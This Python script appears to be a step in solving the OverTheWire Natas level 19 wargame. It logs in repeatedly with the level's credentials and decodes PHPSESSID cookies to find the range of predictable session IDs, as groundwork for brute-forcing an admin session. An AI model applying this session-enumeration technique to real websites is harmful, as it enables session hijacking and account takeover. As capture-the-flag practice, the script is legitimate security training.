#!/usr/bin/env python3
import requests

auth_user = 'natas19'
auth_pass = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
target = 'http://natas19.natas.labs.overthewire.org'
data = {'username':'admin','password':'password'}

boundaries = {'min': 999999, 'max': 0}
ids = []

for i in range(100):
	r = requests.post(
		target,
		auth=(auth_user, auth_pass),
		data=data)
	id = int(r.cookies['PHPSESSID'].replace('2d61646d696e', ''))
	print(id)
	if id < boundaries['min']:
		boundaries['min'] = id
	if id > boundaries['max']:
		boundaries['max'] = id

print("min = %s" % boundaries['min'])
print("max = %s" % boundaries['max'])
